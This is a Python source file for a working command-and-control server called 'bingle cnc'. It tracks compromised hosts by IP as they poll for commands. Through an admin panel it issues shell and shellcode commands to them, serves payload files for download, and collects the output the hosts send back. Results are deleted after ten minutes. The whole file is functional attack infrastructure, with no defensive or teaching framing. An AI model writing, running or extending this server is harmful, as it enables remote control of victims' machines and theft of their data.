#!/usr/bin/env python3
# bingle cnc
# usage:  python3 cnc.py [port]

import sys
import os
import json
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime, timedelta
import threading
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
COMMAND_FILE = "command.txt"
RESULT_FILE = "results.log"
PAYLOAD_DIR = "payloads"
LOG_RETENTION_MINUTES = 10

if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("none")

if not os.path.exists(PAYLOAD_DIR):
    os.makedirs(PAYLOAD_DIR)
    print(f"[*] Created payload directory: {PAYLOAD_DIR}/")

def load_command():
    with open(COMMAND_FILE, "r") as f:
        return f.read().strip()

seen_targets = set()
seen_targets_lock = threading.Lock()

def cleanup_old_logs():
    if not os.path.exists(RESULT_FILE):
        return

    now = datetime.now()
    cutoff = now - timedelta(minutes=LOG_RETENTION_MINUTES)

    try:
        with open(RESULT_FILE, "r") as f:
            content = f.read()
    except Exception:
        return

    if not content.strip():
        return

    separator = '=' * 60 + '\n'
    entries = content.split(separator)

    kept_entries = []
    removed_count = 0

    for entry in entries:
        text = entry.strip()
        if not text:
            continue

        lines = text.split('\n')
        first_line = lines[0].strip()

        if first_line.startswith('[') and ']' in first_line:
            ts_str = first_line[1:first_line.index(']')]
            try:
                entry_time = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S")
                if entry_time >= cutoff:
                    kept_entries.append(text)
                else:
                    removed_count += 1
                    continue
            except ValueError:
                pass

        kept_entries.append(text)

    with open(RESULT_FILE, "w") as f:
        for i, entry in enumerate(kept_entries):
            f.write(entry)
            if i < len(kept_entries) - 1:
                f.write('\n' + separator)

    if removed_count > 0:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Log cleanup: removed {removed_count} old entries, kept {len(kept_entries)}")

def periodic_log_cleanup():
    while True:
        time.sleep(60)
        cleanup_old_logs()

def print_target_count():
    while True:
        time.sleep(30)
        with seen_targets_lock:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Targets: {len(seen_targets)}")

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/command.txt":
            client_ip = self.client_address[0]
            with seen_targets_lock:
                if client_ip not in seen_targets:
                    seen_targets.add(client_ip)
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")

            command = load_command()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(command.encode())
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Beacon polled -> served: {command}")

        elif path == "/admin":
            command = load_command()
            with seen_targets_lock:
                target_count = len(seen_targets)
            html = f"""<!DOCTYPE html>
<html>
<head>
<title>bingle cnc</title>
<style>
body {{ font-family: 'Consolas', monospace; background: #0a0a0a; color: #00ff00; margin: 40px; }}
h1 {{ color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }}
label {{ display: block; margin: 20px 0 5px; color: #0f0; }}
input[type=text] {{ width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #0f0; color: #0f0; font-family: monospace; font-size: 14px; }}
input[type=submit] {{ background: #0f0; color: #000; padding: 10px 30px; border: none; cursor: pointer; font-weight: bold; margin-top: 15px; }}
input[type=submit]:hover {{ background: #0c0; }}
.status {{ margin-top: 20px; padding: 10px; background: #111; border: 1px solid #0f0; }}
.example {{ color: #888; font-size: 12px; margin-top: 5px; }}
.output {{ background: #111; padding: 10px; border: 1px solid #333; margin-top: 20px; }}
pre {{ white-space: pre-wrap; word-break: break-all; }}
</style>
</head>
<body>
<h1>bingle cnc</h1>
<form method="POST" action="/admin">
<label>command to execute on beacon:</label>
<input type="text" name="command" value="{self._escape(command)}" placeholder="e.g., shell 'whoami'" autofocus>
<div class="example">Examples: <strong>none</strong> (idle) | <strong>shell 'dir C:\\'</strong> | <strong>shellcode '\\x90\\x90\\xEB\\xFE'</strong></div>
<input type="submit" value="Deploy Command">
</form>
<div class="status">
<p>current command: <strong>{self._escape(command)}</strong></p>
<p>targets: <strong>{target_count}</strong> &nbsp;|&nbsp; beacon polls every 30s &nbsp;|&nbsp; log retention: <strong>{LOG_RETENTION_MINUTES} minutes</strong></p>
</div>
<div class="output">
<p><strong>recent beacon output ({LOG_RETENTION_MINUTES} min window):</strong></p>
<pre>{self._get_recent_output()}</pre>
</div>
<p><strong>available payloads:</strong> {self._list_payloads()}</p>
</body>
</html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(html.encode())

        elif path == "/results":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            if os.path.exists(RESULT_FILE):
                with open(RESULT_FILE, "r") as f:
                    self.wfile.write(f.read().encode())
            else:
                self.wfile.write(b"no results yet.")

        else:
            filename = os.path.basename(path.lstrip("/"))
            if not filename:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"not found")
                return

            filepath = os.path.join(PAYLOAD_DIR, filename)
            if os.path.exists(filepath):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(os.path.getsize(filepath)))
                self.send_header("Cache-Control", "no-cache")
                self.end_headers()
                with open(filepath, "rb") as f:
                    self.wfile.write(f.read())
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Served {filename} ({os.path.getsize(filepath)} bytes)")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"not found")

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/admin":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode()
            params = parse_qs(body)

            if "command" in params:
                new_cmd = params["command"][0].strip()
                with open(COMMAND_FILE, "w") as f:
                    f.write(new_cmd)
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Command updated to: {new_cmd}")

            self.send_response(303)
            self.send_header("Location", "/admin")
            self.end_headers()

        elif path == "/result.txt":
            client_ip = self.client_address[0]
            with seen_targets_lock:
                if client_ip not in seen_targets:
                    seen_targets.add(client_ip)
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] New target: {client_ip} (total: {len(seen_targets)})")

            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode()
            params = parse_qs(body)
            data = params.get("data", [""])[0]
            data = unquote(data)

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] beacon output:\n{data}\n{'='*60}\n"

            with open(RESULT_FILE, "a") as f:
                f.write(log_entry)

            cleanup_old_logs()

            print(f"[{timestamp}] got output from beacon ({len(data)} bytes)")

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"not found")

    def _escape(self, text):
        text = text.replace("&", "&amp;")
        text = text.replace("<", "&lt;")
        text = text.replace(">", "&gt;")
        text = text.replace('"', "&quot;")
        return text

    def _get_recent_output(self):
        if not os.path.exists(RESULT_FILE):
            return "No output received yet."
        with open(RESULT_FILE, "r") as f:
            lines = f.readlines()
        return "".join(lines[-20:]) if lines else "no output received yet."

    def _list_payloads(self):
        if not os.path.exists(PAYLOAD_DIR):
            return "none"
        files = [f for f in os.listdir(PAYLOAD_DIR) if os.path.isfile(os.path.join(PAYLOAD_DIR, f))]
        if not files:
            return "none"
        return ", ".join(f'<a href="/{f}" style="color:#0f0;">{f}</a>' for f in files)

    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

if __name__ == "__main__":
    print(f"""
+----------------------------------------------+
|                   bingle cnc                 |
+----------------------------------------------+
|  admin panel: http://0.0.0.0:{PORT}/admin      |
|  command:     http://0.0.0.0:{PORT}/command.txt|
|  results:     http://0.0.0.0:{PORT}/results    |
|  payloads:    http://0.0.0.0:{PORT}/<file>     |
|  log retention: {LOG_RETENTION_MINUTES} min                       |
+----------------------------------------------+
""")

    cleanup_thread = threading.Thread(target=periodic_log_cleanup, daemon=True)
    cleanup_thread.start()

    status_thread = threading.Thread(target=print_target_count, daemon=True)
    status_thread.start()

    server = ThreadedHTTPServer(("0.0.0.0", PORT), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n shutting down cnc...")
        server.server_close()
